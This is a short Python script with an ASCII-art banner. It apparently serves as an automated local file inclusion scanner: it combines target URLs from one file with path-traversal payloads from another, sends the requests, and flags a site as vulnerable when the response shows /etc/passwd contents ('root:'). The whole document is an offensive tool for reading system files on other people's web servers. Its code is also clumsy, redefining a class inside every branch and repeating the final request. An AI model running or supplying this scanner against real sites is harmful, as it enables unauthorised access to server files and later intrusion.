import os 
import requests
import re
from pyfiglet import Figlet

class couleur:
		  	OK = '\033[91m' 
		  	ba= '\033[92m' 

figlet = Figlet(font='slant')
result = figlet.renderText("Ys jhonson")
dak= figlet.renderText("Le wana")

print(couleur.ba+result)
print(couleur.ba+dak)



file = open('lfi.txt', 'r')

for line in file :
	line1=line.strip()
	file1 = open('payload.txt', 'r')
	for line2 in file1:
		line3 = line2.strip()
		req1 = requests.get(line1+line3)
		dab1 = req1.content
		a = str(dab1)
		x = re.search('root:', a)
		if x :
			class couleur:
			 	OK = '\033[91m' 
			 	ba= '\033[92m' 
			print(req1.url+' '+couleur.ba+'YES !!!!!')
		else :
			class couleur:
			 	OK = '\033[91m' 
			 	ba= '\033[92m' 
		  
			
			print(req1.url+' '+couleur.OK+'NO vulnerable [+]')
	req2=requests.get(line1+line3)
	dab2=req2.content
	b=str(dab2)
	z = re.search('root:', b)
	if z :
		class couleur:
		  	OK = '\033[91m' 
		  	ba= '\033[92m' 
		  	
		print(req2.url+' '+couleur.ba+'YES !!!!')
	else :
		class couleur:
		  	OK = '\033[91m' 
		  	ba= '\033[92m' 
		  
		print(req2.url+' '+couleur.OK+'NO vulnerable [+]')
